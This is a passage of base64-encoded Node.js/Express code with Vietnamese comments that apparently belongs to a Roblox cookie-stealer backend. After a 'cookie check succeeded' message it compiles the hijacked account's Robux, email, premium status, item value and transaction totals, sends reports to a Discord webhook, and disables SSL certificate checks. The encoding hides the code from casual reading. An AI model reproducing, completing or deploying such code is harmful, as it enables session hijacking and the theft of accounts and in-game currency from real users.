b29rVXJsLCBjb21iaW5lZFdlYmhvb2spOw0KICAgICAgICBjb25zb2xlLmxvZygnR%2BG7rWkgd2ViaG9vayB04burIGZpbGUgdGjDoG5oIGPDtG5nJyk7DQoNCiAgICAgICAgLy8gVHLhuqMgduG7gSBr4bq%2FdCBxdeG6ow0KICAgICAgICByZXMuc3RhdHVzKDIwMCkuanNvbih7DQogICAgICAgICAgICBzdWNjZXNzOiB0cnVlLA0KICAgICAgICAgICAgbWVzc2FnZTogIktp4buDbSB0cmEgY29va2llIHRow6BuaCBjw7RuZyEiLA0KICAgICAgICAgICAgZGF0YTogew0KICAgICAgICAgICAgICAgIHVzZXJJZCwNCiAgICAgICAgICAgICAgICB1c2VybmFtZTogdXNlckRhdGEubmFtZSwNCiAgICAgICAgICAgICAgICBkaXNwbGF5TmFtZTogdXNlckRhdGEuZGlzcGxheU5hbWUsDQogICAgICAgICAgICAgICAgcm9idXg6IHJvYnV4UmVzLmRhdGEucm9idXggfHwgMCwNCiAgICAgICAgICAgICAgICBwcmVtaXVtOiBwcmVtaXVtUmVzLmRhdGEsDQogICAgICAgICAgICAgICAgZW1haWw6IGVtYWlsUmVzLmRhdGEsDQogICAgICAgICAgICAgICAgYXZhdGFyOiBhdmF0YXJSZXMuZGF0YS5kYXRhWzBdLmltYWdlVXJsLA0KICAgICAgICAgICAgICAgIGhhc1ZlcmlmeUhhdDogaGFzVmVyaWZ5SGF0LA0KICAgICAgICAgICAgICAgIHJhcDogcm9saW1vbnNSZXMuZGF0YS5yYXAgfHwgMCwNCiAgICAgICAgICAgICAgICByb2xpbW9uczogYGh0dHBzOi8vd3d3LnJvbGltb25zLmNvbS9wbGF5ZXIvJHt1c2VySWR9YCwNCiAgICAgICAgICAgICAgICBwZW5kaW5nUm9idXhUb3RhbDogdHJhbnNhY3Rpb25zLnBlbmRpbmdSb2J1eFRvdGFsLA0KICAgICAgICAgICAgICAgIHByZW1pdW1TdGlwZW5kc1RvdGFsOiB0cmFuc2FjdGlvbnMucHJlbWl1bVN0aXBlbmRzVG90YWwsDQogICAgICAgICAgICAgICAgZGV2ZWxvcGVyRXhjaGFuZ2VUb3RhbDogdHJhbnNhY3Rpb25zLmRldmVsb3BlckV4Y2hhbmdlVG90YWwsDQogICAgICAgICAgICAgICAgcHVyY2hhc2VzVG90YWw6IHRyYW5zYWN0aW9ucy5wdXJjaGFzZXNUb3RhbA0KICAgICAgICAgICAgfQ0KICAgICAgICB9KTsNCg0KICAgIH0gY2F0Y2ggKGVycm9yKSB7DQogICAgICAgIGlmIChlcnJvci5yZXNwb25zZSkgew0KICAgICAgICAgICAgY29uc29sZS5lcnJvcignTOG7l2k6JywgZXJyb3IucmVzcG9uc2Uuc3RhdHVzKTsNCiAgICAgICAgICAgIGNvbnNvbGUuZXJyb3IoJ0NoaSB0aeG6v3Q6JywgZXJyb3IucmVzcG9uc2UuZGF0YSk7DQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICBjb25zb2xlLmVycm9yKCdM4buXaSBraMO0bmcgeMOhYyDEkeG7i25oOicsIGVycm9yLm1lc3NhZ2UpOw0KICAgICAgICB9DQogICAgICAgIA0KDQoNCg0KDQogICAgICAgIGNvbnN0IGVycm9yTWVzc2FnZSA9IHsNCiAgICAgICAgICAgIHRpdGxlOiAn4p2MIEzhu5dpIEtp4buDbSBUcmEgQ29va2llJywNCiAgICAgICAgICAgIGRlc2NyaXB0aW9uOiBlcnJvci5tZXNzYWdlIHx8ICdM4buXaSBraMO0bmcgeMOhYyDEkeG7i25oJywNCiAgICAgICAgICAgIGRldGFpbHM6IGBUaOG7nWkgZ2lhbjogJHtuZXcgRGF0ZSgpLnRvTG9jYWxlU3RyaW5nKCd2aS1WTicpfVxuTcOjIGzhu5dpOiAke2Vycm9yLmNvZGUgfHwgJ0tow7RuZyB4w6FjIMSR4buLbmgnfWANCiAgICAgICAgfTsNCg0KICAgICAgICAvLyBH4butaSB3ZWJob29rIHRow7RuZyBiw6FvIGzhu5dpDQogICAgICAgIHRyeSB7DQogICAgICAgICAgICBhd2FpdCBheGlvcy5wb3N0KERJU0NPUkRfV0VCSE9PS19VUkwsIHsNCiAgICAgICAgICAgICAgICBlbWJlZHM6IFt7DQogICAgICAgICAgICAgICAgICAgIHRpdGxlOiBlcnJvck1lc3NhZ2UudGl0bGUsDQogICAgICAgICAgICAgICAgICAgIGRlc2NyaXB0aW9uOiBlcnJvck1lc3NhZ2UuZGVzY3JpcHRpb24sDQogICAgICAgICAgICAgICAgICAgIGNvbG9yOiAweEZGMDAwMCwNCiAgICAgICAgICAgICAgICAgICAgZmllbGRzOiBbDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgbmFtZTogJ0NoaSB0aeG6v3QnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHZhbHVlOiBlcnJvck1lc3NhZ2UuZGV0YWlscw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICBdLA0KICAgICAgICAgICAgICAgICAgICB0aW1lc3RhbXA6IG5ldyBEYXRlKCkudG9JU09TdHJpbmcoKQ0KICAgICAgICAgICAgICAgIH1dDQogICAgICAgICAgICB9KTsNCiAgICAgICAgfSBjYXRjaCAod2ViaG9va0Vycm9yKSB7DQogICAgICAgICAgICBjb25zb2xlLmVycm9yKCdM4buXaSBn4butaSB3ZWJob29rOicsIHdlYmhvb2tFcnJvci5tZXNzYWdlKTsNCiAgICAgICAgfQ0KDQogICAgICAgIHJlcy5zdGF0dXMoNTAwKS5qc29uKHsNCiAgICAgICAgICAgIHN1Y2Nlc3M6IGZhbHNlLA0KICAgICAgICAgICAgZXJyb3I6IGVycm9yTWVzc2FnZS5kZXNjcmlwdGlvbiwNCiAgICAgICAgICAgIGRldGFpbHM6IGVycm9yTWVzc2FnZS5kZXRhaWxzDQogICAgICAgIH0pOw0KICAgIH0NCn0pOw0KDQovLyBD4bqldSBow6xuaCBETlMgc2VydmVycw0KZG5zLnNldFNlcnZlcnMoWw0KICAgICc4LjguOC44JywgICAgLy8gR29vZ2xlIEROUw0KICAgICc4LjguNC40JywgICAgLy8gR29vZ2xlIEROUyAoYmFja3VwKQ0KICAgICcxLjEuMS4xJywgICAgLy8gQ2xvdWRmbGFyZSBETlMNCiAgICAnMS4wLjAuMScgICAgIC8vIENsb3VkZmxhcmUgRE5TIChiYWNrdXApDQpdKTsNCg0KLy8gVOG6oW8gaW5zdGFuY2UgYXhpb3MgduG7m2kgY%2BG6pXUgaMOsbmggdMO5eSBjaOG7iW5oDQpjb25zdCBheGlvc0luc3RhbmNlID0gYXhpb3MuY3JlYXRlKHsNCiAgICB0aW1lb3V0OiAzMDAwMCwgLy8gMzAgc2Vjb25kcw0KICAgIGh0dHBzQWdlbnQ6IG5ldyBodHRwcy5BZ2VudCh7DQogICAgICAgIHJlamVjdFVuYXV0aG9yaXplZDogZmFsc2UsIC8vIELhu48gcXVhIGzhu5dpIFNTTA0KICAgICAgICBrZWVwQWxpdmU6IHRydWUsDQogICAgICAgIHRpbWVvdXQ6IDMwMDAwDQogICAgfSksDQogICAgcHJveHk6IGZhbHNlLCAvLyBU4bqvdCBwcm94eSBt4bq3YyDEkeG7i25oDQogICAgbWF4UmVkaXJlY3RzOiA1DQp9KTsNCg0KDQphcHAubGlzdGVuKFBPUlQsICgpID0%2BIHsNCiAgICBjb25zb2xlLmxvZyhgU2VydmVyIGlzIHJ1bm5pbmcgb24gaHR0cDovL2xvY2FsaG9zdDoke1BPUlR9YCk7DQp9KTsNCg%3D%3D
